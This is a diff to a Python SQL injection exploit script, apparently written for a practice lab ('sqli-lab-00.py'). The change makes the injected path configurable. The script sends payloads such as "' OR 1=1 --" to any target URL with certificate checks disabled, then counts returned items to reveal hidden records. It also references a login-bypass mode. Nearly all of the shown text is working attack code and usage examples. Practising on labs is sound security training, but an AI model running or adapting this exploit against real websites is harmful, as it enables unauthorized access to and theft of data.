@@ -16,16 +16,16 @@ def run_exploit(args):
     exploit_type = sys.argv[1]
     if exploit_type == 'wc':
         try:
-            url, payload, visible, var_to_count = sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5]
-        # If it doesn't have the 4 parameters, we print an error.
+            url, path_qparams, payload, visible, var_to_count = sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6]
+        # If it doesn't have the 5 parameters, we print an error.
         except IndexError:
-            print("[-] Usage: %s <exploit_type> <url> <payload> <visible> <var_to_count>" % sys.argv[0])
-            print('[-] Example: python3 %s wc https://website.net "\' OR 1=1 --" 12 productId=' % sys.argv[0])
+            print("[-] Usage: %s <exploit_type> <url> <path_qparams> <payload> <visible> <var_to_count>" % sys.argv[0])
+            print('[-] Example: python3 %s wc https://website.net "/filter?category=" "\' OR 1=1 --" 12 productId=' % sys.argv[0])
             sys.exit(-1)
         #for a in args:
             #print('WC exploit choose: ', a)
         #where_clause(url, payload, visible, var_to_count)
-        where_clause = WhereClause.exploit_sqli(url, payload, visible, var_to_count)
+        where_clause = WhereClause.exploit_sqli(url, path_qparams, payload, visible, var_to_count)
         
     elif exploit_type == 'lb':
         try:
@@ -51,10 +51,11 @@ class WhereClause():
         self.var_to_count = var_to_count
         
         
-    def exploit_sqli(url, payload, visible, var_to_count):
+    def exploit_sqli(url, path_qparams, payload, visible, var_to_count):
         #print('WhereClause Exploit: ', url, payload, visible, var_to_count)
         uri = '/filter?category='
-        req = requests.get(url + uri + payload, verify=False, proxies=proxies)
+        #req = requests.get(url + uri + payload, verify=False, proxies=proxies)
+        req = requests.get(url + path_qparams + payload, verify=False, proxies=proxies)
         # Check if the response code has an unreleased item that is not public.
         html = req.text
         # Check how many products are loaded in HTML by counting items.
@@ -131,6 +132,6 @@ if __name__ == "__main__":
         args = sys.argv[1:]
         run_exploit(args)
     except IndexError:
-        print("[-] Usage: python3 sqli-lab-00.py wc ")
+        print("[-] Usage: python3 %s wc " % sys.argv[0])
         print("wc = Where Clause")
         print("lb = Login Bypass")
